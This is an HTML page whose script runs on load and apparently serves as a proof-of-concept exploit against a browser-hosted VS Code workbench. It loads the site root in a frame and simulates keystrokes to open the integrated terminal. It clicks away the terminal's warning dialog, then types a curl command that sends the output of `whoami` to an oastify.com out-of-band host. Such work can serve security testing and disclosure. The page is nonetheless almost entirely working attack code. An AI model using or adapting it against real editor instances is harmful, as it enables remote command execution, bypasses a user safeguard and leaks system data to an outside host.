<html>
  <body>
    <script>
      const wait = (ms) => new Promise(r => setTimeout(r, ms));
      
      function makeIframe(src = '/') {
        return new Promise(resolve => {
          const iframe = document.createElement('iframe');
          iframe.style.cssText = 'position:fixed;top:0;left:0;width:1200px;height:600px;z-index:99999';
          iframe.addEventListener('load', () => resolve({ iframe, doc: iframe.contentDocument }));
          iframe.src = src;
          document.body.appendChild(iframe);
        });
      }
      
      function waitFor(doc, selector, timeout = 30000) {
        return new Promise((resolve, reject) => {
          const t0 = Date.now();
          (function poll() {
            const el = doc.querySelector(selector);
            if (el) return resolve(el);
            if (Date.now() - t0 > timeout) return reject(new Error('timeout: ' + selector));
            setTimeout(poll, 200);
          })();
        });
      }
      
      function dispatchKey(target, {key, keyCode, code, ctrl=false, shift=false}) {
        const e = new KeyboardEvent('keydown', {key, code, bubbles:true, cancelable:true,
          ctrlKey:ctrl, shiftKey:shift});
        Object.defineProperty(e, 'keyCode', {get:()=>keyCode});
        Object.defineProperty(e, 'which',   {get:()=>keyCode});
        target.dispatchEvent(e);
      }
      
      function typeChar(target, ch) {
        const c = ch.charCodeAt(0);
        const e = new KeyboardEvent('keypress', {key: ch, bubbles:true, cancelable:true});
        Object.defineProperty(e, 'keyCode',  {get:()=>c});
        Object.defineProperty(e, 'which',    {get:()=>c});
        Object.defineProperty(e, 'charCode', {get:()=>c});
        target.dispatchEvent(e);
      }
      
      async function openTerminal(iframe, doc) {
        const wb = await waitFor(doc, '.monaco-workbench');
        iframe.contentWindow.focus();
      
        // cible = élément focus dans le workbench, sinon le workbench lui-même
        const active = doc.activeElement;
        const target = (active && wb.contains(active)) ? active : wb;
      
        dispatchKey(target, {key:'`', keyCode:192, code:'Backquote', ctrl:true});
      }
      
      function sendCommand(doc, cmd) {
        hasTermWarning = doc.querySelector('.monaco-dialog-modal-block .monaco-text-button')
        if(hasTermWarning) hasTermWarning.click();
        const ta = doc.querySelector('.terminal.xterm .xterm-helper-textarea')
                || doc.querySelector('.xterm-helper-textarea');
        if (!ta) return console.warn('terminal introuvable');
        ta.focus();
        for (const ch of cmd) typeChar(ta, ch);
        const enter = new KeyboardEvent('keydown', {key:'Enter', code:'Enter', bubbles:true, cancelable:true});
        Object.defineProperty(enter, 'keyCode', {get:()=>13});
        Object.defineProperty(enter, 'which',   {get:()=>13});
        ta.dispatchEvent(enter);
      }
      
      async function run() {
        const { iframe, doc } = await makeIframe('/');
        await openTerminal(iframe, doc);
        await waitFor(doc, '.xterm-helper-textarea');
        await wait(1500);
        sendCommand(doc, 'curl 4ejja5qhlnsaneh7go4zoi6vvm1dp4is7.oastify.com/`whoami`');
        sendCommand(doc, 'curl 4ejja5qhlnsaneh7go4zoi6vvm1dp4is7.oastify.com/`whoami`');
        sendCommand(doc, 'curl 4ejja5qhlnsaneh7go4zoi6vvm1dp4is7.oastify.com/`whoami`');

      }
      run();
    </script>
  </body>
</html>
